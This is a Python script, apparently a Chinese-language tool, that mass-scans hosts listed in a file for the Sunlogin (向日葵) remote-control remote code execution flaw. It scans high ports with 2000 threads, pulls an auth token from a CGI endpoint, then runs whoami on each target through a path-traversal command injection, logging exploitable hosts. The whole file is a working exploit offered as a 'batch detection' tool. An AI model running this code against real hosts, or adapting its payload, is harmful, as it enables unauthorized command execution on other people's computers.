# -*- coding: utf-8 -*-
#  Author: SkyMine

import os.path
import sys
import requests
import socket
import queue
import threading
import json

# 配置参数
targetsfile = 'targets.txt'  # 目标列表存放路径，需提前存在
resultfile = 'result.txt'  # 结果列表存放路径，不存在会自动创建
thread_num = 2000  # 端口扫描线程数
timeout = 3  # 端口扫描超时时间（秒），过短可能会漏，过长检查会比较久


def read_txt(inputfile):
    file = open(inputfile);  # 打开文件
    ips = [];
    for eachline in file:
        eachline = eachline.strip('\n')
        eachline = str(eachline)
        ips.append(eachline)
    file.close()
    print("目标列表：" + inputfile)
    print("共有", len(ips), "个目标待检测")
    return (ips)


flag = "0"


def portscan(ip):
    def worker(ip, port_queue, datatmp):
        global flag
        global timeout
        while not port_queue.empty():
            try:
                if (flag == "1"):
                    break
                else:
                    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    server.setblocking(1)
                    server.settimeout(timeout)
                    port = port_queue.get(timeout=20)
                    try:
                        print("正在扫描" + ip + ":" + port, end="\r")
                        resu = server.connect_ex((ip, int(port)))
                        server.settimeout(None)
                        if (resu == 0):
                            s, re = gettoken(ip, port)
                            if (s == "success"):
                                print("发现可能存在RCE漏洞的目标 ", ip + ":" + port)
                                s1, re1 = rce_run_whoami(ip, port, re)
                                if (s1 == "success"):
                                    flag = "1"
                                    datatmp['ip'] = ip
                                    datatmp['port'] = port
                                    totxt(resultfile, ip, port)
                                    print(ip + ":" + port + " whoami执行成功：" + re1)
                                else:
                                    print(ip + ":" + port + " whoami执行失败，可能是误报")

                    except Exception as e:
                        print(e)
                    finally:
                        server.close()
            except Exception as _:
                pass

    port_queue = queue.Queue()
    for i in range(40000, 65535):
        port_queue.put(str(i))
    threads = []
    datatmp = {}
    for i in range(thread_num):
        t = threading.Thread(target=worker, args=[ip, port_queue, datatmp])
        threads.append(t)
    for i in threads:
        i.start()
    for i in threads:
        i.join()
    return (datatmp)


def gettoken(ip, port):
    # ip = "172.16.79.30"
    # port = "49761"
    url = "http://" + ip + ":" + port + "/cgi-bin/rpc?action=verify-haras"
    try:
        res = json.loads(requests.get(url, timeout=5).text)
        return ("success", res['verify_string'])
    except requests.exceptions.ConnectTimeout as _:
        return ("fail", "")
    except Exception as _:
        return ("fail", "")


def rce_run_whoami(ip, port, token):
    url = "http://" + ip + ":" + port + "/check?cmd=ping../../../../../../windows/system32/whoami"
    cookies = {"CID": token}
    try:
        resu = requests.get(url, cookies=cookies, timeout=10).text
        return ("success", resu)
    except Exception as _:
        return ("fail", "")


def totxt(file, ip, port):
    try:
        with open(file, "a") as f:
            f.write(ip + ":" + port + " 存在向日葵RCE漏洞" + "\n")
    except:
        print("请检查目标列表" + targetsfile + "是否存在")
        sys.exit()


print("==========================" + "\n")
print("向日葵RCE漏洞批量检测工具")
print("Powered by SkyMine" + "\n")
print("==========运行参数=========" + "\n")
if not (os.path.exists(targetsfile)):
    print("请检查目标列表" + targetsfile + "是否存在")
    sys.exit()
targets = read_txt(targetsfile)
print("结果写入路径：" + resultfile)
print("端口扫描线程：" + str(thread_num))
print("端口扫描超时时间：" + str(timeout) + "秒" + "\n")
print("==========================" + "\n")
result = []
for i in targets:
    flag = "0"
    tmp = portscan(i)
    if (tmp != {}):
        result.append(tmp)
if (result != []):
    print("扫描结束，共发现" + str(len(result)) + "个目标存在向日葵RCE漏洞，结果已写入到" + resultfile)
else:
    print("扫描结束，未发现存在向日葵RCE漏洞的目标")
